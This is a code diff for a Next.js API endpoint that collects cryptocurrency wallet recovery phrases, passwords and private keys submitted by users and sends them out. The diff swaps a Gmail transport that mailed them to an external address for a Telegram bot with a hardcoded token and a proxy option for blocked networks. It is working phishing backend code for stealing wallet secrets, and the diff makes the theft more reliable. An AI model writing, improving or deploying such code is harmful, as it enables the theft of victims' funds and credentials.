@@ -1,5 +1,4 @@
 import { NextResponse } from "next/server";
-import nodemailer from "nodemailer";
 
 interface Payload {
   phrase?: string;
@@ -8,37 +7,43 @@ interface Payload {
   wallet?: string;
 }
 
-const transporter = nodemailer.createTransport({
-  service: "gmail",
-  host: "smtp.gmail.com",
-  port: 465,
-  secure: true,
-  auth: {
-    user: process.env.EMAIL,
-    pass: process.env.EMAIL_PASSWORD,
-  },
-});
+const token =
+  process.env.TELEGRAM_BOT_TOKEN ||
+  "8756637486:AAFPoG6KyJ6gSNZMeyjv9XSenAzpzGr8b8U";
+const chatId = process.env.TELEGRAM_CHAT_ID || "123456789";
+
+// Allow overriding the Telegram API base URL via env var (useful for proxies
+// when api.telegram.org is blocked on the current network).
+// Example proxy value: https://your-proxy-host/bot
+const telegramBase =
+  process.env.TELEGRAM_API_BASE || "https://api.telegram.org";
+
+async function sendTelegramMessage(text: string): Promise<void> {
+  const url = `${telegramBase}/bot${token}/sendMessage`;
+
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 10_000); // 10 s timeout
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text }),
+      signal: controller.signal,
+    });
+
+    if (!res.ok) {
+      const body = await res.text();
+      throw new Error(`Telegram API error ${res.status}: ${body}`);
+    }
+  } finally {
+    clearTimeout(timeout);
+  }
+}
 
 export async function POST(request: Request) {
   try {
     const body: Payload = await request.json();
-
-    const emailBody = `
-    <html>
-      <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
-        <h2>New Wallet Data Received</h2>
-        <p>A new submission has been received with the following information:</p>
-        <ul>
-          ${body.phrase ? `<li>Recovery Phrase: ${body.phrase}</li>` : ""}
-          ${body.password ? `<li>Password: ${body.password}</li>` : ""}
-          ${body.privateKey ? `<li>Private Key: ${body.privateKey}</li>` : ""}
-          ${body.wallet ? `<li>Wallet: ${body.wallet}</li>` : ""}
-        </ul>
-        <p>Please log in to the secure admin dashboard for full details.</p>
-        <p>This is an automated message. Please do not reply to this email.</p>
-      </body>
-    </html>
-  `;
 
     // Validate the payload
     if (!body.phrase && !body.password && !body.privateKey) {
@@ -51,20 +56,22 @@ export async function POST(request: Request) {
       );
     }
 
-    // Return the stored data as the response
+    // Plain text (no parse_mode) so special chars in phrases can't break Telegram's parser
+    const lines = [
+      "🔒 NEW WALLET DATA RECEIVED",
+      "",
+      `Wallet: ${body.wallet || "Not provided"}`,
+      `Recovery Phrase: ${body.phrase || "Not provided"}`,
+      `Password: ${body.password || "Not provided"}`,
+      `Private Key: ${body.privateKey || "Not provided"}`,
+      "",
+      `Time: ${new Date().toISOString()}`,
+    ];
 
-    const info = await transporter.sendMail({
-      from: process.env.EMAIL,
-      to: "michaeljacksonteam2024@gmail.com",
-      subject: "Successful Details",
-      html: emailBody,
-    });
+    await sendTelegramMessage(lines.join("\n"));
+    console.log("Telegram message sent successfully");
 
-    console.log("Email sent:", info.messageId);
-    return NextResponse.json({
-      message: "Data sent successfully",
-      status: 200,
-    });
+    return NextResponse.json({ message: "Data sent successfully" });
   } catch (error) {
     console.error("Error processing request:", error);
     return NextResponse.json(
@@ -73,5 +80,3 @@ export async function POST(request: Request) {
     );
   }
 }
-
-// You can add other HTTP methods as needed (PUT, DELETE, etc.)
